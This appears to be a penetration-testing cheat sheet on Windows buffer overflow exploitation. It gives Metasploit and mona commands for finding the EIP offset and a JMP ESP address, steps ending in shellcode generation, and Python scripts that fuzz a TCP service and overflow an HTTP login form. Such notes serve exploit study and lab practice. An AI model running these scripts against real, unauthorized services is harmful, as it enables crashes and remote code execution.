## Win

### BUFFER OVERFLOW COMMANDS
```bash
msf-pattern_create -l 4000
msf-pattern_offset -l 4000 -q 39794338
!mona modules
!mona find -s "\xFF\xE4" –m "<MODULE>"
```



### Steps

1. Crash The Application: Send "A"*<NUMBER>
2. Find EIP: Replace "A" w/ pattern_create.rb -l LENGTH
3. Control ESP: !mona findmsp (@crashtime), pattern_offset.rb, !mona pattern_offset eip
4. Identify Bad Characters
5. Find JMP ESP
6. Generate Shell Code



### BUFFER OVERFLOW FUZZING SCRIPT

```python
#!/usr/bin/python
import socket
RHOST = ""
RPORT = ####
buf = "A" * 4000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
print "Sending buf"
s.send(buf + '\n')
```



### BUFFER OVERFLOW OVER HTTP SCRIPT

```python
content = "username=" + inputBuffer + "&password=A"

buffer = "POST /login HTTP/1.1\r\n"
buffer += "Host: <IP>\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Referer: http://<IP>/login\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "Content-Length:  "+str(len(content))+"\r\n"
buffer += "\r\n"

buffer += content

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.139.10", 80))
s.send(buffer)

s.close()
```
